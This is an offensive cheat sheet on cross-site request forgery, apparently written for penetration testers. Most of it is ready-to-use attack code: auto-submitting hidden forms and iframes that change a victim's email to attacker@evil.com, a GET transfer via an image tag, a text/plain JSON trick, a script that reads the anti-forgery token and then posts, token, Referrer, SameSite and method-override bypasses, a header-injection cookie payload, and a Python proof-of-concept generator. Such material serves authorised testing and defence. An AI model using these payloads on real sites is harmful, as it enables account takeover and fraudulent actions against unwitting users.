# CSRF (Cross-Site Request Forgery)

Force authenticated users to perform unintended actions by exploiting automatic cookie inclusion.

## TL;DR

```html
<form action="https://target/change-email" method="POST">
  <input name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit()</script>
```

## Prerequisites

1. **Valuable action** - Password change, email change, transfer
2. **Cookie-based auth** - No custom headers required
3. **No unpredictable tokens** - Missing or bypassable CSRF tokens

## Detection

```javascript
// Browser console - find CSRF tokens
document.querySelectorAll('input[name*="csrf"], input[name*="token"]')
document.querySelector('meta[name="csrf-token"]')
```

**Quick Test:**
1. Capture request in Burp
2. Right-click → Engagement tools → Generate CSRF PoC
3. Test if action succeeds without token

## Exploitation

### Basic POST Form

```html
<html>
<body>
<form action="https://target.com/change-email" method="POST" id="csrfform">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit()</script>
</body>
</html>
```

### GET Request via Image

```html
<img src="https://target.com/transfer?to=attacker&amount=1000" style="display:none">
```

### Hidden iframe (No Navigation)

```html
<iframe style="display:none" name="csrfframe"></iframe>
<form method="POST" action="/change-email" target="csrfframe">
  <input name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit()</script>
```

### JSON Content-Type

```html
<form method="POST" action="https://target/api" enctype="text/plain">
  <input name='{"email":"attacker@evil.com","garbage":"' value='"}'>
</form>
<script>document.forms[0].submit()</script>
```

Results in: `{"email":"attacker@evil.com","garbage":"="}`

### Steal Token + Attack

```javascript
fetch('https://target/profile')
  .then(r => r.text())
  .then(html => {
    let token = html.match(/name="csrf" value="([^"]+)"/)[1];
    fetch('https://target/change-email', {
      method: 'POST',
      credentials: 'include',
      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
      body: `email=attacker@evil.com&csrf=${token}`
    });
  });
```

## Bypasses

### Method Override (POST→GET)

```http
GET /change-email?email=attacker@evil.com&_method=POST HTTP/1.1
```

**Override headers:**
```http
X-HTTP-Method: DELETE
X-HTTP-Method-Override: PUT
```

### Remove/Empty Token

```html
<!-- Token param absent -->
<form action="/action" method="POST">
  <input name="email" value="test@test.com">
</form>

<!-- Token empty -->
<input name="csrf" value="">
```

### Token Not User-Bound

1. Login as attacker, get valid CSRF token
2. Use attacker's token in victim's request

### Referrer Bypass

```html
<!-- Suppress Referrer -->
<meta name="referrer" content="never">

<!-- Include target domain in attacker URL -->
<script>
  history.pushState('', '', '?target.com');
  document.forms[0].submit();
</script>
<!-- Referrer: https://attacker.com?target.com -->
```

### SameSite=Lax Bypass

`SameSite=Lax` allows top-level navigation via GET:

```html
<a href="https://target.com/change-setting?value=malicious">Click me</a>
```

### Cookie Injection (Double Submit)

If CSRF uses double-submit (cookie = form value):
```html
<img src="https://target.com/?x=%0d%0aSet-Cookie:%20csrf=pwned">
<form action="https://target.com/action" method="POST">
  <input name="csrf" value="pwned">
</form>
```

## Bypass Checklist

- [ ] Remove token parameter entirely
- [ ] Send empty token value
- [ ] Change POST to GET
- [ ] Use method override (_method, X-HTTP-Method-Override)
- [ ] Try another user's token
- [ ] Suppress Referrer header
- [ ] Manipulate Referrer to contain target domain
- [ ] Use text/plain content-type for JSON
- [ ] Test SameSite=Lax with top-level GET navigation

## Tools

| Tool | Purpose |
|------|---------|
| **Burp Suite** | Generate CSRF PoC |
| **XSRFProbe** | CSRF scanner |

**Quick PoC Generator:**
```python
def csrf_poc(url, params, method="POST"):
    inputs = "\n".join([f'<input name="{k}" value="{v}">' for k,v in params.items()])
    return f'''<html><body>
<form action="{url}" method="{method}">{inputs}</form>
<script>document.forms[0].submit()</script>
</body></html>'''
```
